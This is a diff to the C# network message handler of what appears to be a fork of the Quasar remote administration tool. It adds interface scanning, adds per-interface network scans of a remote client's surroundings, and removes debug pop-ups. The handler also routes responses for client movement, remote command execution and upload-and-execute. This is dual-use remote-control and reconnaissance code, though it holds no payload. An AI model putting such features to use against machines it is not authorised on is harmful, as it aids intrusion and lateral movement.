@@ -1,7 +1,6 @@
 ﻿using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.other;
-using Quasar.Common.Models;
 using Quasar.Common.Networking;
 using Quasar.Server.Networking;
 using Quasar.Server.Models;
@@ -12,6 +11,7 @@ using System.Collections;
 using System.Diagnostics;
 using System.Net;
 using System;
+using Quasar.Common.Models.Network;
 
 namespace Quasar.Server.Messages
 {
@@ -24,9 +24,20 @@ namespace Quasar.Server.Messages
         }
     }
 
+    public class InterfaceScanResponseEventArgs : EventArgs
+    {
+        public DoInterfaceScanResponse Packet { get; set; }
+        public InterfaceScanResponseEventArgs(DoInterfaceScanResponse packet)
+        {
+            this.Packet = packet;
+        }
+    }
+
     public class NetworkHandler : MessageProcessorBase<NetworkEntity[]>
     {
         public event EventHandler<NetworkScanResponseEventArgs> NetworkScanResponseEvent;
+
+        public event EventHandler<InterfaceScanResponseEventArgs> InterfaceScanResponseEvent;
 
         private readonly Client _client;
 
@@ -36,6 +47,7 @@ namespace Quasar.Server.Messages
         }
 
         public override bool CanExecute(IMessage message) => message is DoNetworkScanResponse ||
+                                                             message is DoInterfaceScanResponse || 
                                                              message is DoClientMovementResponse ||
                                                              message is DoRemoteCommandExecuteResponse ||
                                                              message is DoUploadAndExecuteResponse ||
@@ -48,12 +60,20 @@ namespace Quasar.Server.Messages
             NetworkScanResponseEvent?.Invoke(this, e);
         }
 
+        protected virtual void OnInterfaceScanResponse(InterfaceScanResponseEventArgs e)
+        {
+            InterfaceScanResponseEvent?.Invoke(this, e);
+        }
+
         public override void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
                 case DoNetworkScanResponse scanResp:
                     Execute(sender, scanResp);
+                    break;
+                case DoInterfaceScanResponse intrResp:
+                    Execute(sender, intrResp);
                     break;
                 case DoClientMovementResponse moveResp:
                     Execute(sender, moveResp);
@@ -70,11 +90,14 @@ namespace Quasar.Server.Messages
             }
         }
 
-        public void RefreshEntities()
+        public void RefreshInterfaces()
         {
-            MessageBox.Show("Requesting Network Scan...");
-            _client.Send(new DoNetworkScan());
-            MessageBox.Show("Requested!");
+            _client.Send(new DoInterfaceScan());
+        }
+
+        public void RefreshEntities(InterfaceEntity entity)
+        {
+            _client.Send(new DoNetworkScan { nic = entity });
         }
 
         public void MoveToEntity(NetworkEntity entity)
@@ -95,6 +118,11 @@ namespace Quasar.Server.Messages
         private void Execute(ISender client, DoNetworkScanResponse message)
         {
             OnNetworkScanResponse(new NetworkScanResponseEventArgs(message));
+        }
+
+        private void Execute(ISender client, DoInterfaceScanResponse message)
+        {
+            OnInterfaceScanResponse(new InterfaceScanResponseEventArgs(message));
         }
 
         private void Execute(ISender client, DoClientMovementResponse message)
